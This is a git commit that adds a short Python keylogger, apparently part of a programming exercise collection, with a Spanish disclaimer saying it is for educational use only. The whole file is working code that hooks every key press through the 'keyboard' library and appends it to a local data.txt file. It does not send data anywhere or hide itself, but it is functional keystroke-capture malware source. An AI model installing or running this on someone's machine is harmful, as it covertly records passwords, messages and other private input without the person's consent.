4b113e0257cbdc7eaeff3ef3cb7be5dd1b188b2e
Carlos <guillermopayllon@gmail.com>
2024-12-05 20:55:31 +0100

    Create keylogger.py
    Key Logger solo para uso educativo, úsalo con responsabilidad

---
+++ advanced/keylogger.py
@@ -0,0 +1,23 @@
+##############################################################################################
+### Project: KEYLOGGER                                                                     ###
+### Author: Guillermo Ayllon                                                               ###
+### Date: 05/12/2024                                                                       ###
+### Vers: 1.0                                                                              ###
+### Level: Advanced                                                                        ###
+### Description: keylogger en Python.                                                      ###
+##############################################################################################
+
+## SOLO PARA USO EDUCATIVO USALO CON RESPONSABILIDAD
+
+import keyboard
+
+def keyPressed(key):
+    
+    with open('data.txt', 'a') as file:
+        
+        if key.name == 'space':
+            file.write(' ')
+        else:
+            file.write(key.name)
+keyboard.on_press(keyPressed)
+keyboard.wait()
